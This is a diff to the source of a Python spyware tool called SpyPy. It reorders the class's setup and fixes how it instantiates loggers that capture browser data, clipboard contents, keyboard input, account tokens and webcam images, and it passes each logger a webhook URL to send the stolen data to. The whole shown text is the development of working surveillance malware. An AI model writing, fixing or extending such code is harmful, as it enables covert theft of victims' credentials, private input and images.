@@ -53,8 +53,6 @@ class SpyPy:
         self.is_exe = is_exe()
         self.first_run_flag = os.path.join(self.logs_path, f"{SOFTWARE_EXE_NAME}.flag")
 
-        self.setup()
-
         self.loggers = []
         try:
             if self.is_exe:
@@ -72,7 +70,7 @@ class SpyPy:
                     if globals().get(logger_class_name):
                         self.loggers.append(globals()[logger_class_name](SOFTWARE_DIR_NAME, WEBHOOK_URL))
             else:
-                logger_classes = [
+                self.loggers = [
                     BrowserLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                     ClipboardLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                     InputLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
@@ -82,15 +80,15 @@ class SpyPy:
                     TokenLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                     WebcamLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                 ]
-            for logger in logger_classes:
-                self.loggers.append(logger())
         except Exception as e:
             send_webhook(
                 WEBHOOK_URL, "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
             )
             os._exit(1)
-
+            
         self.threads = []
+
+        self.setup()
 
     def start(self):
         for logger in self.loggers:
